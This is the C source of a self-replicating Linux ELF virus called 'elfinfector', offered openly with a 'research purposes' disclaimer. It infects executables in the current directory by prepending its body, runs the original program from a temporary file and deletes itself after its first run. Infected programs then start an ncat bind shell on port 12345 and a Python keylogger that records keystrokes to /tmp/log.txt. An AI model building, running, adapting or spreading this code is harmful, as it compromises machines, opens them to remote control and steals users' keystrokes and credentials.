// elfinfector
// Developed by Branitskiy Alexander
// Use accurately and only for research purposes!

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <elf.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>

#define VIR_LEN 13794 // length of compiled virus
#define TMP_FILE "/tmp/orig_body" // name of temporary file
#define MAX_INFECTED_FILES 1 // max quantity of infected files at once
#define INFECTED_LABEL "THIS FILE IS INFECTED!" // label of infected file
// check data ends with INFECTED_LABEL
#define ENDS_WITH_INFECTED_LABEL(data, data_len) ((data_len) >= sizeof(INFECTED_LABEL) && \
strncmp((data) + (data_len) - sizeof(INFECTED_LABEL), INFECTED_LABEL, sizeof(INFECTED_LABEL)) == 0)
#define SELF_DESTRUCT 1 // for destroying the virus after its first execution

void *read_data_from_fd(void *data, int fd, off_t len, off_t offset, int whence) {
  // read data from the file desriptor and save it to a buffer
  lseek(fd, offset, whence);
  if (data == NULL)
    data = malloc(len);
  read(fd, data, len);
  return data;
}

void write_data_to_fd(const void *data, int fd, off_t len, off_t offset, int whence) {
  // write data to the file desriptor
  lseek(fd, offset, whence);
  write(fd, data, len);
}

u_char infect(char *vic_file, const char *vir_body)
{
  printf("Try to infect file '%s'...\n", vic_file);
  // read victim ELF-header
  const int fd = open(vic_file, O_RDWR);
  // read the file header
  Elf32_Ehdr ehdr;
  read_data_from_fd(&ehdr, fd, sizeof(ehdr), 0, SEEK_CUR);
  // consider magic sequence of ELF-file
  const char belf[] = {'\x7f', 'E', 'L', 'F'};
   // check the victim file is ELF-file
  if (strncmp(ehdr.e_ident, belf, sizeof(belf)) != 0) {
    printf("The file '%s' is not infected (it's not ELF-file)\n", vic_file);
    return 0;
  }
  // check the victim file is executable
  if (ehdr.e_type != ET_EXEC) {
    printf("The file '%s' is not infected (it's not executable)\n", vic_file);
    return 0;
  }
  // get information about the victim file
  struct stat status;
  fstat(fd, &status);
  const off_t vic_len = status.st_size;
  // read the label of infected file at the end of victim file body
  char buf[sizeof(INFECTED_LABEL)];
  read_data_from_fd(buf, fd, sizeof(INFECTED_LABEL), vic_len - sizeof(INFECTED_LABEL), SEEK_SET);
  // if such label exists then the victim file has been already infected
  if (ENDS_WITH_INFECTED_LABEL(buf, sizeof(buf))) {
    printf("The file '%s' has been already infected\n", vic_file);
    return 0;
  }
  // read the victim file body and save it to the buffer
  u_char *vic_body = read_data_from_fd(NULL, fd, vic_len, 0, SEEK_SET);
  // at first write the virus body to the beginning of the file (including label)
  write_data_to_fd(vir_body, fd, VIR_LEN, 0, SEEK_SET);
  // further write a victim file body
  write_data_to_fd(vic_body, fd, vic_len, 0, SEEK_CUR);
  free(vic_body);
  // finally add a label of infected file
  write_data_to_fd(INFECTED_LABEL, fd, sizeof(INFECTED_LABEL), 0, SEEK_CUR);
  close(fd);
  printf("The file '%s' was infected successfully!\n", vic_file);
  return 1;
}

void find_victim_and_infect(const char *vir_body, u_char is_vir)
{
  char dir[100];
  // get a current directory
  getcwd(dir, sizeof(dir));
  // open a current directory
  DIR *dirp = opendir(dir);
  // read content of a current directory
  struct dirent *d;
  size_t n_infected_files = 0;
  while (n_infected_files < MAX_INFECTED_FILES && (d = readdir(dirp)) != NULL)
  {
    // check for 'deleted' (or 'unused', 'stale', 'unlinked') entries in old file systems
    if (d->d_ino != 0)
      n_infected_files += infect(d->d_name, vir_body); // perform file infection
  }
  closedir(dirp);
  if (n_infected_files == 0)
    printf("There is nothing to infect\n");
  // call malware code only within infected victim file, but not within virus
  if (is_vir == 0) {
    const char *malware_type = getenv("MALWARE_TYPE");
    // by defalut execute bindbash and keylogger in the background
    if (malware_type == NULL || strcmp(malware_type, "RUN_BINDBASH") == 0) {
      const char *run_bindbash_cmd = "pgrep -f '^ncat -l -p 12345' > /dev/null || "
        "nohup ncat -l -p 12345 -e /bin/bash -k > /dev/null 2>&1 &";
      printf("Run command '%s'\n", run_bindbash_cmd);
      system(run_bindbash_cmd);
    }
    if (malware_type == NULL || strcmp(malware_type, "RUN_KEYLOGGER") == 0) {
      const char *run_keylogger_cmd =
        "pgrep -f '^python3 -c .* from pynput.keyboard' > /dev/null || "
        "nohup python3 -c \""
        "try:\n"
        "  from pynput.keyboard import Listener\n"
        "except ImportError:\n"
        "  print('Install pynput...')\n"
        "  import os; os.system('pip3 install pynput')\n"
        "  from pynput.keyboard import Listener\n"
        "\n"
        "log_file = '/tmp/log.txt'\n"
        "log = lambda e, s: (open(log_file, 'a')."
        "write(f'{getattr(e, \\\"char\\\", str(e))} {s}\\n'), e)[1]\n"
        "\n"
        "with Listener(on_press=lambda e: log(e, 'pressed'), "
        "on_release=lambda e: log(e, 'released')) as l: "
        "l.join()\" > /dev/null 2>&1 &";
      printf("Run command '%s'\n", run_keylogger_cmd);
      system(run_keylogger_cmd);
    }
    if (malware_type != NULL && strcmp(malware_type, "KILL_BINDBASH") == 0) {
      const char *kill_keylogger_cmd = "kill $(pgrep -f 'ncat -l -p 12345')";
      printf("Kill command '%s'\n", kill_keylogger_cmd);
      system(kill_keylogger_cmd);
    }
    if (malware_type != NULL && strcmp(malware_type, "KILL_KEYLOGGER") == 0) {
      const char *kill_keylogger_cmd = "kill $(pgrep -f 'python3 -c .* from pynput.keyboard')";
      printf("Kill command '%s'\n", kill_keylogger_cmd);
      system(kill_keylogger_cmd);
    }
  }
}

int main(int argc, char *argv[], char *envp[])
{
  // open ourselves and calculate the program length
  const int fd = open(argv[0], O_RDONLY);
  struct stat status;
  // get information about the executed file
  fstat(fd, &status);
  const off_t full_len = status.st_size;
  // move the file pointer to the beginning of the file and read data
  u_char *vir_body = read_data_from_fd(NULL, fd, VIR_LEN, 0, SEEK_SET);
  // check the program length:
  // 1. if the program length is not equal to VIR_LEN
  //    then the infected victim file is executed
  // 2. otherwise the original virus is executed
  if (full_len != VIR_LEN) { // the infected victim file is executed
    printf("The infected file '%s' is executed\n", argv[0]);
    // separate the body of the original program from the virus
    const off_t orig_len = full_len - VIR_LEN;
    u_char *orig_body = read_data_from_fd(NULL, fd, orig_len, VIR_LEN, SEEK_SET);
    // save the body of the original program into the temporary file
    const int tmp_fd = open(TMP_FILE, O_RDWR|O_CREAT|O_TRUNC, status.st_mode);
    write_data_to_fd(orig_body, tmp_fd, orig_len, 0, SEEK_CUR);
    close(tmp_fd);
    free(orig_body);
    const pid_t pid = fork();
    if (pid != 0) { // here is a parent process
      printf("The virus body is executed\n");
      // find some victim program and infect it
      find_victim_and_infect(vir_body, 0);
      int exit_status;
      // wait for the child process to finish
      waitpid(pid, &exit_status, 0);
      if (WIFEXITED(exit_status)) {
        const int exit_code = WEXITSTATUS(exit_status);
        if (exit_code == 127)
          printf(TMP_FILE" process was not started\n");
        else
          printf(TMP_FILE" process was finished with code %d\n", exit_code);
      }
      else if (WIFSIGNALED(exit_status))
        printf(TMP_FILE" process was killed by a signal %d\n", WTERMSIG(exit_status));
    }
    else { // here is a child process
      printf("The original program is executed\n");
      // execute the original program (temporary file)
      execve(TMP_FILE, argv, envp);
      // this code is executed only if execve is failed
      perror("execve failed");
      exit(1);
    }
    // remove the temporary file
    unlink(TMP_FILE);
  }
  else { // the virus itself is executed
    printf("The original virus '%s' is executed\n", argv[0]);
    // find some victim program and infect it
    find_victim_and_infect(vir_body, 1);
  }
  close(fd);
  free(vir_body);
  // remove virus after its first execution
  if (full_len == VIR_LEN && SELF_DESTRUCT)
    unlink(argv[0]);
  return 0;
}
